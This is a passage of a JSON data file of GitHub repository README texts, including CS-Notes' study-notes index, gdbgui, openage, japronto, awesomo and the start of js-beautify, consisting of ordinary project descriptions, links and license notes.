[\u5251\u6307 Offer \u9898\u89e3](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u5251\u6307%20Offer%20\u9898\u89e3%20-%20\u76ee\u5f55.md)\n- [Leetcode \u9898\u89e3](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Leetcode%20\u9898\u89e3%20-%20\u76ee\u5f55.md)\n- [\u7b97\u6cd5](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u7b97\u6cd5%20-%20\u76ee\u5f55.md)\n- [\u7b14\u8bd5\u9762\u8bd5\u9898\u5e93](https:\/\/www.nowcoder.com\/contestRoom?from=cyc_github)\n\n## :computer: \u64cd\u4f5c\u7cfb\u7edf\n\n- [\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u8ba1\u7b97\u673a\u64cd\u4f5c\u7cfb\u7edf%20-%20\u76ee\u5f55.md)\n- [Linux](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Linux.md)\n\n## :cloud: \u7f51\u7edc \n\n- [\u8ba1\u7b97\u673a\u7f51\u7edc](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u8ba1\u7b97\u673a\u7f51\u7edc%20-%20\u76ee\u5f55.md)\n- [HTTP](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/HTTP.md)\n- [Socket](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Socket.md)\n\n## :art: \u9762\u5411\u5bf9\u8c61\n\n- [\u9762\u5411\u5bf9\u8c61\u601d\u60f3](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u9762\u5411\u5bf9\u8c61\u601d\u60f3.md)\n- [\u8bbe\u8ba1\u6a21\u5f0f](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u8bbe\u8ba1\u6a21\u5f0f%20-%20\u76ee\u5f55.md)\n\n## :floppy_disk: \u6570\u636e\u5e93\n\n- [\u6570\u636e\u5e93\u7cfb\u7edf\u539f\u7406](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u6570\u636e\u5e93\u7cfb\u7edf\u539f\u7406.md)\n- [SQL](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/SQL.md)\n- [Leetcode-Database \u9898\u89e3](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Leetcode-Database%20\u9898\u89e3.md)\n- [MySQL](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/MySQL.md)\n- [Redis](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Redis.md)\n\n## :coffee: Java\n\n- [Java \u57fa\u7840](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Java%20\u57fa\u7840.md)\n- [Java \u5bb9\u5668](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Java%20\u5bb9\u5668.md)\n- [Java \u5e76\u53d1](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Java%20\u5e76\u53d1.md)\n- [Java \u865a\u62df\u673a](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Java%20\u865a\u62df\u673a.md)\n- [Java I\/O](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Java%20IO.md)\n\n## :bulb: \u7cfb\u7edf\u8bbe\u8ba1 \n\n- [\u7cfb\u7edf\u8bbe\u8ba1\u57fa\u7840](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u7cfb\u7edf\u8bbe\u8ba1\u57fa\u7840.md)\n- [\u5206\u5e03\u5f0f](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u5206\u5e03\u5f0f.md)\n- [\u96c6\u7fa4](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u96c6\u7fa4.md)\n- [\u653b\u51fb\u6280\u672f](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u653b\u51fb\u6280\u672f.md)\n- [\u7f13\u5b58](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u7f13\u5b58.md)\n- [\u6d88\u606f\u961f\u5217](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u6d88\u606f\u961f\u5217.md)\n\n## :wrench: \u5de5\u5177 \n\n- [Git](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Git.md)\n- [Docker](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/Docker.md)\n- [\u6784\u5efa\u5de5\u5177](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u6784\u5efa\u5de5\u5177.md)\n- [\u6b63\u5219\u8868\u8fbe\u5f0f](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u6b63\u5219\u8868\u8fbe\u5f0f.md)\n\n## :watermelon: \u7f16\u7801\u5b9e\u8df5 \n\n- [\u4ee3\u7801\u53ef\u8bfb\u6027](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u4ee3\u7801\u53ef\u8bfb\u6027.md)\n- [\u4ee3\u7801\u98ce\u683c\u89c4\u8303](https:\/\/github.com\/CyC2018\/CS-Notes\/blob\/master\/notes\/\u4ee3\u7801\u98ce\u683c\u89c4\u8303.md)\n\n## :memo: \u540e\u8bb0\n\n<div align=\"center\">\n\t<a href=\"https:\/\/www.nowcoder.com\/discuss\/137593?from=cyc_github\"> \u6211\u7684\u9762\u7ecf <\/a> \/ <a href=\"https:\/\/cyc2018.github.io\"> \u6211\u7684\u7b80\u5386 <\/a> \/ <a href=\"https:\/\/github.com\/CyC2018\/Markdown-Resume\"> \u7b80\u5386\u6a21\u7248 <\/a> \/ <a href=\"https:\/\/github.com\/CyC2018\/Job-Recommend\"> \u5185\u63a8 <\/a> \/ <a href=\"https:\/\/xiaozhuanlan.com\/CyC2018\"> \u4e13\u680f <\/a> \/ <a href=\"assets\/QQ2\u7fa4.png\"> QQ \u7fa4<\/a>\n\t<br><br>\n    <img width=\"320px\" src=\"https:\/\/cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com\/githubio\/\u516c\u4f17\u53f7\u4e8c\u7ef4\u7801-2.png\"><\/img>\n<\/div>\n\n\n\n### \u6392\u7248\n\n\u7b14\u8bb0\u5185\u5bb9\u6309\u7167 [\u4e2d\u6587\u6587\u6848\u6392\u7248\u6307\u5317](https:\/\/github.com\/sparanoid\/chinese-copywriting-guidelines) \u8fdb\u884c\u6392\u7248\uff0c\u4ee5\u4fdd\u8bc1\u5185\u5bb9\u7684\u53ef\u8bfb\u6027\u3002\n\n\u4e0d\u4f7f\u7528 `![]()` \u8fd9\u79cd\u65b9\u5f0f\u6765\u5f15\u7528\u56fe\u7247\uff0c\u800c\u662f\u7528 `<img>` \u6807\u7b7e\u3002\u4e00\u65b9\u9762\u662f\u4e3a\u4e86\u80fd\u591f\u63a7\u5236\u56fe\u7247\u4ee5\u5408\u9002\u7684\u5927\u5c0f\u663e\u793a\uff0c\u53e6\u4e00\u65b9\u9762\u662f\u56e0\u4e3a [GFM](https:\/\/github.github.com\/gfm\/) \u4e0d\u652f\u6301 `<center> ![]() <\/center>` \u8fd9\u79cd\u65b9\u6cd5\u8ba9\u56fe\u7247\u5c45\u4e2d\u663e\u793a\uff0c\u53ea\u80fd\u4f7f\u7528 `<div align=\"center\"> <img src=\"\"\/> <\/div>` \u8fbe\u5230\u5c45\u4e2d\u7684\u6548\u679c\u3002\n\n\u5728\u7ebf\u6392\u7248\u5de5\u5177\uff1a[Text-Typesetting](https:\/\/github.com\/CyC2018\/Text-Typesetting)\u3002\n\n### License\n\n\u672c\u4ed3\u5e93\u7684\u5185\u5bb9\u4e0d\u662f\u5c06\u7f51\u4e0a\u7684\u8d44\u6599\u968f\u610f\u62fc\u51d1\u800c\u6765\uff0c\u9664\u4e86\u5c11\u90e8\u5206\u5f15\u7528\u4e66\u4e0a\u548c\u6280\u672f\u6587\u6863\u7684\u539f\u6587\uff08\u8fd9\u90e8\u5206\u5185\u5bb9\u90fd\u5728\u672b\u5c3e\u7684\u53c2\u8003\u94fe\u63a5\u4e2d\u52a0\u4e86\u51fa\u5904\uff09\uff0c\u5176\u4f59\u90fd\u662f\u6211\u7684\u539f\u521b\u3002\u5728\u60a8\u5f15\u7528\u672c\u4ed3\u5e93\u5185\u5bb9\u6216\u8005\u5bf9\u5185\u5bb9\u8fdb\u884c\u4fee\u6539\u6f14\u7ece\u65f6\uff0c\u8bf7\u7f72\u540d\u5e76\u4ee5\u76f8\u540c\u65b9\u5f0f\u5171\u4eab\uff0c\u8c22\u8c22\u3002\n\n\u8f6c\u8f7d\u6587\u7ae0\u8bf7\u5728\u5f00\u5934\u660e\u663e\u5904\u6807\u660e\u8be5\u9875\u9762\u5730\u5740\uff0c\u516c\u4f17\u53f7\u7b49\u5176\u5b83\u8f6c\u8f7d\u8bf7\u8054\u7cfb zhengyc101@163.com\u3002\n\nLogo\uff1a[logomakr](https:\/\/logomakr.com\/)\n\n<a rel=\"license\" href=\"http:\/\/creativecommons.org\/licenses\/by-nc-sa\/4.0\/\"><img alt=\"\u77e5\u8bc6\u5171\u4eab\u8bb8\u53ef\u534f\u8bae\" style=\"border-width:0\" src=\"https:\/\/i.creativecommons.org\/l\/by-nc-sa\/4.0\/88x31.png\" \/><\/a>\n\n### \u81f4\u8c22\n\n\u611f\u8c22\u4ee5\u4e0b\u4eba\u5458\u5bf9\u672c\u4ed3\u5e93\u505a\u51fa\u7684\u8d21\u732e\uff0c\u5f53\u7136\u4e0d\u4ec5\u4ec5\u53ea\u6709\u8fd9\u4e9b\u8d21\u732e\u8005\uff0c\u8fd9\u91cc\u5c31\u4e0d\u4e00\u4e00\u5217\u4e3e\u4e86\u3002\u5982\u679c\u4f60\u5e0c\u671b\u88ab\u6dfb\u52a0\u5230\u8fd9\u4e2a\u540d\u5355\u4e2d\uff0c\u5e76\u4e14\u63d0\u4ea4\u8fc7 Issue \u6216\u8005 PR\uff0c\u8bf7\u4e0e\u6211\u8054\u7cfb\u3002\n\n<a href=\"https:\/\/github.com\/linw7\">\n    <img src=\"https:\/\/avatars3.githubusercontent.com\/u\/21679154?s=400&v=4\" width=\"50px\">\n<\/a> \n<a href=\"https:\/\/github.com\/g10guang\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/18458140?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/Sctwang\">\n    <img src=\"https:\/\/avatars3.githubusercontent.com\/u\/33345444?s=400&v=4\" width=\"50px\">\n<\/a> \n<a href=\"https:\/\/github.com\/ResolveWang\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/8018776?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/crossoverJie\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/15684156?s=400&v=4\" width=\"50px\">\n<\/a> \n<a href=\"https:\/\/github.com\/jy03078584\">\n    <img src=\"https:\/\/avatars2.githubusercontent.com\/u\/7719370?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/kwongtailau\">\n    <img src=\"https:\/\/avatars0.githubusercontent.com\/u\/22954582?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/xiangflight\">\n    <img src=\"https:\/\/avatars2.githubusercontent.com\/u\/10072416?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/mafulong\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/24795000?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/yanglbme\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/21008209?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/OOCZC\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/11623828?s=400&v=4\" width=\"50px\">\n<\/a>\n<a href=\"https:\/\/github.com\/5renyuebing\">\n    <img src=\"https:\/\/avatars1.githubusercontent.com\/u\/32872430?s=400&v=4\" width=\"50px\">\n<\/a>\n"},{"repo":"\/cs01\/gdbgui","language":"JavaScript","readme_contents":"<p align=\"center\">\n<a href=\"http:\/\/gdbgui.com\"><img src=\"https:\/\/github.com\/cs01\/gdbgui\/raw\/master\/images\/gdbgui_banner.png\"><\/a>\n<\/p>\n\n<h3 align=\"center\">\nA modern, browser-based frontend to gdb (gnu debugger)\n<\/h3>\n\n<p align=\"center\">\n<a href=\"https:\/\/travis-ci.org\/cs01\/gdbgui\">\n<img src=\"https:\/\/travis-ci.org\/cs01\/gdbgui.svg?branch=master\" alt=\"image\" \/><\/a>\n\n<a href=\"https:\/\/pypi.python.org\/pypi\/gdbgui\/\">\n<img src=\"https:\/\/img.shields.io\/badge\/pypi-0.13.2.0-blue.svg\" alt=\"image\" \/>\n<\/a>\n\n<img src=\"https:\/\/pepy.tech\/badge\/gdbgui\" alt=\"image\" \/>\n\n<\/p>\n\n---\n\n**Documentation**: https:\/\/gdbgui.com\n\n**Source Code**: https:\/\/github.com\/cs01\/gdbgui\/\n"},{"repo":"\/SFTtech\/openage","language":"C++","readme_contents":"[![openage](\/assets\/logo\/banner.png)](http:\/\/openage.sft.mx)\n============================================================\n\n**openage**: a volunteer project to create a free engine clone of the *Genie Engine* used by *Age of Empires*, *Age of Empires II (HD)* and *Star Wars: Galactic Battlegrounds*, comparable to projects like [OpenMW](https:\/\/openmw.org\/), [OpenRA](http:\/\/openra.net\/),  [OpenSAGE](https:\/\/github.com\/OpenSAGE\/OpenSAGE\/), [OpenTTD](https:\/\/openttd.org\/) and [OpenRCT2](https:\/\/openrct2.org\/). At the moment we focus our efforts on the integration of *Age of Empires II*, while being primarily aimed at POSIX platforms such as **GNU\/Linux**.\n\nopenage uses the original game assets (such as sounds and graphics), but (for obvious reasons) doesn't ship them.\nTo play, you require *an original AoE II: TC or [AoE II: HD](http:\/\/store.steampowered.com\/app\/221380\/)* installation\n(via [Wine](https:\/\/www.winehq.org\/) or [Steam-Linux](doc\/media_convert.md#how-to-use-the-original-game-assets)).\n\n[![github stars](https:\/\/img.shields.io\/github\/stars\/SFTtech\/openage.svg)](https:\/\/github.com\/SFTtech\/openage\/stargazers)\n[![#sfttech on Freenode](https:\/\/img.shields.io\/badge\/chat-on%20freenode-brightgreen)](https:\/\/webchat.freenode.net\/?channels=sfttech)\n[![#sfttech on matrix.org](https:\/\/img.shields.io\/badge\/matrix-%23sfttech-blue.svg)](https:\/\/riot.im\/app\/#\/room\/#sfttech:matrix.org)\n[![quality badge](https:\/\/img.shields.io\/badge\/cuteness-overload-orange.svg)](http:\/\/www.emergencykitten.com\/)\n\n\n\nContact\n-------\nContact  | Where?\n---------|-------\nIssue Tracker | [SFTtech\/openage](https:\/\/github.com\/SFTtech\/openage\/issues)\nDevelopment Blog | [blog.openage.sft.mx](https:\/\/blog.openage.sft.mx)\nForum | [<img src=\"https:\/\/www.redditstatic.com\/about\/assets\/reddit-logo.png\" alt=\"reddit\" height=\"22\"\/> \/r\/openage](https:\/\/www.reddit.com\/r\/openage\/)\nMatrix Chat | [`#sfttech:matrix.org`](https:\/\/riot.im\/app\/#\/room\/#sfttech:matrix.org)\nIRC Chat | [`irc.freenode.net #sfttech`](https:\/\/webchat.freenode.net\/?channels=sfttech)\nMoney Sink | [![money sink](https:\/\/liberapay.com\/assets\/widgets\/donate.svg)](https:\/\/liberapay.com\/SFTtech)\n\n\nTechnical foundation\n--------------------\n\nTechnology     | Component\n---------------|----------\n**C++17**      | Engine core\n**Python3**    | Scripting, media conversion, in-game console, code generation\n**Qt5**        | Graphical user interface\n**Cython**     | Glue code\n**CMake**      | Build system\n**OpenGL3.3**  | Rendering, shaders\n**SDL2**       | Cross-platform Audio\/Input\/Window handling\n**Opus**       | Audio codec\n[**nyan**](https:\/\/github.com\/SFTtech\/nyan) | Content Configuration and Modding\n**Humans**     | Mixing together all of the above\n\n\nGoals\n-----\n\n* Fully authentic look and feel\n  * This can only be approximated, since the behaviour of the original game is mostly undocumented,\n    and guessing\/experimenting can only get you this close\n  * We will not implement useless artificial limitations (max 30 selectable units...)\n* Multiplayer (obviously)\n* Matchmaking and ranking with a [haskell masterserver](https:\/\/github.com\/SFTtech\/openage-masterserver)\n* Optionally, [improvements](\/doc\/ideas\/) over the original game\n* AI scripting in Python, you can use [machine learning](http:\/\/scikit-learn.org\/stable\/)\n  * here is some [additional literature](http:\/\/www.deeplearningbook.org\/)\n* Re-creating [free game assets](https:\/\/github.com\/SFTtech\/openage-data)\n* An easily-moddable content format: [**nyan** yet another notation](https:\/\/github.com\/SFTtech\/nyan)\n* An integrated Python console and API, comparable to [blender](https:\/\/www.blender.org\/)\n* Awesome infrastructure such as our own [Kevin CI service](https:\/\/github.com\/SFTtech\/kevin)\n\nBut beware, for sanity reasons:\n\n* No network compatibility with the original game.\n  You really wanna have the same problems again?\n* No binary compatibility with the original game.\n  A one-way script to convert maps\/savegames\/missions to openage is planned though.\n\n\nCurrent State of the Project\n----------------------------\n\n - What features are currently implemented?\n   - See [doc\/status.md](\/doc\/status.md).\n\n - What's the plan?\n   - See [doc\/milestones.md](\/doc\/milestones.md). We also have [lists of crazy xor good ideas](\/doc\/ideas) and a [technical overview for requested features](\/doc\/ideas\/fr_technical_overview.md). \n\n\nInstallation Packages\n---------------------\n\n**Supported Platforms:** Linux, Windows 10, MacOS X 10.14\n \n  - For **Linux** check at [repology](https:\/\/repology.org\/project\/openage\/versions) if your distribution has any packages available or [here](https:\/\/bintray.com\/simonsan\/openage-packages\/openage-linux-releases) for any future updates on *.deb and AppImage packages.\n  - For **Windows** check our [release page](https:\/\/github.com\/SFTtech\/openage\/releases) for the latest installer or [here](https:\/\/dl.bintray.com\/simonsan\/openage-packages\/) for nightly builds.\n\n    __NOTE:__ If you have any problems starting conversion or starting *openage* take a look into the [package instructions](doc\/build_instructions\/packages.md) and our [troubleshooting guide](\/doc\/troubleshooting.md).\n\n    __NOTE:__ For **MacOSX** we currently don't have any packages.\n\n\nDependencies, Building and Running\n----------------------------------\n\n  Operating System    | Build status\n  :------------------:|:--------------:\n  Debian Sid          | [Todo: Kevin #11](https:\/\/github.com\/SFTtech\/kevin\/issues\/11)\n  MacOSX 10.14        | [![Build Status](https:\/\/travis-ci.org\/SFTtech\/openage.svg?branch=master)](https:\/\/travis-ci.org\/SFTtech\/openage)\n  Windows 10 - x64    | [![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/66sx35key94u740e?svg=true)](https:\/\/ci.appveyor.com\/project\/simonsan\/openage-sl215)\n\n\n - How do I get this to run on my box?\n   - See [doc\/building.md](\/doc\/building.md).\n\n - I compiled everything. Now how do I run it?\n   - Execute `.\/run`.\n   * [The convert script](\/doc\/media_convert.md) will transform original assets into openage formats, which are a lot saner and more moddable.\n   - Use your brain and react to the things you'll see.\n\n - Waaaaaah! It\n   - segfaults\n   - prints error messages I don't want to read\n   - ate my dog\n\nAll of those are features, not bugs.\n\nTo turn them off, use `.\/run --dont-segfault --no-errors --dont-eat-dog`.\n\n\nIf this still does not help, try our [troubleshooting guide](\/doc\/troubleshooting.md), the [contact section](#contact)\nor the [bug tracker](https:\/\/github.com\/SFTtech\/openage\/issues).\n\n\nContributing\n============\n\n* Being typical computer science students, we hate people.\n* Please don't contact us.\n* Nobody likes Age of Empires anyway.\n* None of you are interested in making openage more awesome anyway.\n* We don't want a community.\n* Don't even think about trying to help.\n\nGuidelines:\n\n* No **bug reports** or **feature requests**, the game is perfect as is.\n* Don't try to **fix any bugs**, see above.\n* Don't implement any features, your code is crap.\n* Don't even think about sending a **pull request**.\n* Please ignore the [easy tasks](https:\/\/github.com\/SFTtech\/openage\/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22) that [could just be done](https:\/\/github.com\/SFTtech\/openage\/issues?q=is:issue+is:open+label:%22just+do+it%22).\n* Absolutely never ever participate in this [boring community](https:\/\/www.reddit.com\/r\/openage\/).\n* Don't note the irony, you idiot.\n\nTo prevent accidental violation of one of those guidelines, you should *never*\n\n* [learn git](https:\/\/git-scm.com\/book\/)\n* [fork the repo](https:\/\/help.github.com\/articles\/fork-a-repo)\n* [learn python](https:\/\/docs.python.org\/3\/tutorial\/appetite.html)\n* [learn c++](http:\/\/www.cplusplus.com\/doc\/tutorial\/)\n* read the code and documentation\n* [contribute](\/doc\/contributing.md) anything to the code\n* [contact us](#contact)\n\nCheers, happy hecking.\n\n\nDevelopment Process\n-------------------\n\nWhat does openage development look like in practice?\n - extensive [synchronization](#contact)!\n - [doc\/development.md](\/doc\/development.md).\n\nCan I help?\n - [doc\/contributing.md](\/doc\/contributing.md).\n\nAll documentation is also in this repo:\n\n- Code documentation is embedded in the sources for Doxygen (see [doc readme](\/doc\/README.md)).\n- Have a look at the [doc directory](\/doc\/). This folder tends to get outdated when code changes.\n\n\nLicense\n-------\n\n**GNU GPLv3** or later; see [copying.md](copying.md) and [legal\/GPLv3](\/legal\/GPLv3).\n\nI know that probably nobody is ever gonna look at the `copying.md` file,\nbut if you want to contribute code to openage, please take the time to\nskim through it and add yourself to the authors list.\n"},{"repo":"\/squeaky-pl\/japronto","language":"C","readme_contents":"# Japronto!\n\n[![irc: #japronto](https:\/\/img.shields.io\/badge\/irc-%23japronto-brightgreen.svg)](https:\/\/webchat.freenode.net\/?channels=japronto)\n[![Gitter japronto\/Lobby](https:\/\/badges.gitter.im\/japronto\/Lobby.svg)](https:\/\/gitter.im\/japronto\/Lobby) [![Build Status](https:\/\/travis-ci.org\/squeaky-pl\/japronto.svg?branch=master)](https:\/\/travis-ci.org\/squeaky-pl\/japronto) [![PyPI](https:\/\/img.shields.io\/pypi\/v\/japronto.svg)](https:\/\/pypi.python.org\/pypi\/japronto) [![PyPI version](https:\/\/img.shields.io\/pypi\/pyversions\/japronto.svg)](https:\/\/pypi.python.org\/pypi\/japronto\/)\n\n__There is no new project development happening at the moment, but it's not abandoned either. Pull requests and new maintainers are welcome__.\n\n__If you are a novice Python programmer, you don't like plumbing yourself or you don't have basic understanding of C, this project is not probably what you are looking for__.\n\nJapronto (from Portuguese \"j\u00e1 pronto\" \/\u02c8\u0292a p\u027e\u00f5tu\/ meaning \"already done\") is a __screaming-fast__, __scalable__, __asynchronous__\nPython 3.5+ HTTP __toolkit__ integrated with __pipelining HTTP server__ based on [uvloop](https:\/\/github.com\/MagicStack\/uvloop) and [picohttpparser](https:\/\/github.com\/h2o\/picohttpparser). It's targeted at speed enthusiasts, people who like\nplumbing and early adopters.\n\nYou can read more in the [release announcement on medium](https:\/\/medium.com\/@squeaky_pl\/million-requests-per-second-with-python-95c137af319)\n\nPerformance\n-----------\n\nHere's a chart to help you imagine what kind of things you can do with Japronto:\n\n![Requests per second](benchmarks\/results.png)\n\nAs user @heppu points out Go\u2019s stdlib HTTP server can be 12% faster than the graph shows when written more carefully. Also there is the awesome fasthttp server for Go that apparently is only 18% slower than Japronto in this particular benchmark. Awesome! For details see https:\/\/github.com\/squeaky-pl\/japronto\/pull\/12 and https:\/\/github.com\/squeaky-pl\/japronto\/pull\/14.\n\nThese results of a simple \"Hello world\" application were obtained on AWS c4.2xlarge instance. To be fair all the contestants (including Go) were running single worker process. Servers were load tested using [wrk](https:\/\/github.com\/wg\/wrk) with 1 thread, 100 connections and 24 simultaneous (pipelined) requests per connection (cumulative parallelism of 2400 requests).\n\nThe source code for the benchmark can be found in [benchmarks](benchmarks) directory.\n\nThe server is written in hand tweaked C trying to take advantage of modern CPUs. It relies on picohttpparser for header &\nchunked-encoding parsing while uvloop provides asynchronous I\/O. It also tries to save up on\nsystem calls by combining writes together when possible.\n\nEarly preview\n-------------\n\nThis is an early preview with alpha quality implementation. APIs are provisional meaning that they will change between versions and more testing is needed. Don't use it for anything serious for now and definitely don't use it in production. Please try it though and report back feedback. If you are shopping for your next project's framework I would recommend [Sanic](https:\/\/github.com\/channelcat\/sanic).\n\nAt the moment the work is focused on CPython but I have PyPy on my radar, though I am not gonna look into it until PyPy reaches 3.5 compatibility somewhere later this year and most known JIT regressions are removed.\n\nHello world\n-----------\n\nHere is how a simple web application looks like in Japronto:\n\n```python\nfrom japronto import Application\n\n\ndef hello(request):\n    return request.Response(text='Hello world!')\n\n\napp = Application()\napp.router.add_route('\/', hello)\napp.run(debug=True)\n```\n\nTutorial\n--------\n\n1. [Getting started](tutorial\/1_hello.md)\n2. [Asynchronous handlers](tutorial\/2_async.md)\n3. [Router](tutorial\/3_router.md)\n4. [Request object](tutorial\/4_request.md)\n5. [Response object](tutorial\/5_response.md)\n6. [Handling exceptions](tutorial\/6_exceptions.md)\n7. [Extending request](tutorial\/7_extend.md)\n\nFeatures\n--------\n\n- HTTP 1.x implementation with support for chunked uploads\n- Full support for HTTP pipelining\n- Keep-alive connections with configurable reaper\n- Support for synchronous and asynchronous views\n- Master-multiworker model based on forking\n- Support for code reloading on changes\n- Simple routing\n\nLicense\n-------\n\nThis software is distributed under [MIT License](https:\/\/en.wikipedia.org\/wiki\/MIT_License). This is a very permissive license that lets you use this software for any\ncommercial and non-commercial work. Full text of the license is\nincluded in [LICENSE.txt](LICENSE.txt) file.\n\nThe source distribution of this software includes a copy of picohttpparser which is distributed under MIT license as well.\n"},{"repo":"\/lk-geimfari\/awesomo","language":"JavaScript","readme_contents":"<p align=\"center\"><img src=\"https:\/\/raw.githubusercontent.com\/lk-geimfari\/awesomeo\/master\/artwork\/a.w.e.s.o.m.e_o.png\"><\/p>\n\n<p align=\"center\">\n  <b>A.W.E.S.O.M. O<\/b> is an extensive list of interesting open source projects written in various languages.\n<\/p>\n\nIf you are interested in [Open Source](https:\/\/en.wikipedia.org\/wiki\/Open-source_software) and are considering to join the community of Open Source developers, then here you might find a project that will suit you.\n\n## Languages\n\n - [C](languages\/C.md)\n - [C#](languages\/C%23.md)\n - [C++](languages\/C%2B%2B.md)\n - [Clojure](languages\/CLOJURE.md)\n - [Common Lisp](languages\/COMMON_LISP.md)\n - [Crystal](languages\/CRYSTAL.md)\n - [CSS](languages\/CSS.md)\n - [D](languages\/D.md)\n - [Elixir](languages\/ELIXIR.md)\n - [Elm](languages\/ELM.md)\n - [Emacs Lisp](languages\/EMACS_LISP.md)\n - [Erlang](languages\/ERLANG.md)\n - [Go](languages\/GOLANG.md)\n - [Haskell](languages\/HASKELL.md)\n - [Java](languages\/JAVA.md)\n - [JavaScript](languages\/JAVASCRIPT.md)\n - [Kotlin](languages\/KOTLIN.md)\n - [Lua](languages\/LUA.md)\n - [OCaml](languages\/OCAML.md)\n - [PHP](languages\/PHP.md)\n - [Python](languages\/PYTHON.md)\n - [R](languages\/R.md)\n - [Ruby](languages\/RUBY.md)\n - [Rust](languages\/RUST.md)\n - [Scala](languages\/SCALA.md)\n - [Shell](languages\/SHELL.md)\n - [SVG](languages\/SVG.md)\n - [Swift](languages\/SWIFT.md)\n - [TypeScript](languages\/TYPESCRIPT.md)\n\n## Want to add an interesting project?\n\n- Simply [fork](https:\/\/github.com\/lk-geimfari\/awesomo\/) this repository.\n- Add the project to the list using similar formatting of other projects.\n- Open [new pull request](https:\/\/github.com\/lk-geimfari\/awesomo\/compare).\n\n:point_up: However, keep in mind that we don't accept *mammoth's shit*. Only active and interesting projects with good documentation are added. Dead and abandoned projects will be removed.\n\n## Want to support us?\n\nJust share this list with your friends on [Twitter](https:\/\/twitter.com\/), [Facebook](https:\/\/www.facebook.com\/), [Medium](http:\/\/medium.com) or somewhere else.\n\n## License\n\n`awesomo` by [@lk-geimfari](https:\/\/github.com\/lk-geimfari)\n\nTo the extent possible under law, the person who associated CC0 with `awesomo` has waived all copyright and related or neighboring rights to `awesomo`.\n\nYou should have received a copy of the CC0 legalcode along with this work. If not, see https:\/\/creativecommons.org\/publicdomain\/zero\/1.0\/.\n"},{"repo":"\/beautify-web\/js-beautify","language":"JavaScript","readme_contents":"# JS Beautifier\n[![Build Status](https:\/\/dev.azure.com\/beautifier-io\/js-beautify\/_apis\/build\/status\/beautify-web.js-beautify)](https:\/\/dev.azure.com\/beautifier-io\/js-beautify\/_build\/latest?definitionId=1)\n\n[![PyPI version](https:\/\/img.shields.io\/pypi\/v\/jsbeautifier.svg)](https:\/\/pypi.python.org\/pypi\/jsbeautifier)\n[![CDNJS version](https:\/\/img.shields.io\/cdnjs\/v\/js-beautify.svg)](https:\/\/cdnjs.com\/libraries\/js-beautify)\n[![NPM @latest](https:\/\/img.shields.io\/npm\/v\/js-beautify.svg)](https:\/\/www.npmjs.com\/package\/js-beautify)\n[![NPM @next](https:\/\/img.shields.io\/npm\/v\/js-beautify\/next.svg)](https:\/\/www.npmjs.com\/package\/js-beautify?activeTab=versions)\n\n[![Join the chat at https:\/\/gitter.im\/beautify-web\/js-beautify](https:\/\/badges.gitter.im\/Join%20Chat.svg)](https:\/\/gitter.im\/beautify-web\/js-beautify?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n[![Twitter Follow](https:\/\/img.shields.io\/twitter\/follow\/js_beautifier.svg?style=social&label=Follow)](https:\/\/twitter.com\/intent\/user?screen_name=js_beautifier)\n\n[![NPM stats](https:\/\/nodei.co\/npm\/js-beautify.svg?downloadRank=true&downloads=true)](https:\/\/www.npmjs.org\/package\/js-beautify) [![Greenkeeper badge](https:\/\/badges.greenkeeper.io\/beautify-web\/js-beautify.svg)](https:\/\/greenkeeper.io\/)\n\n\nThis little beautifier 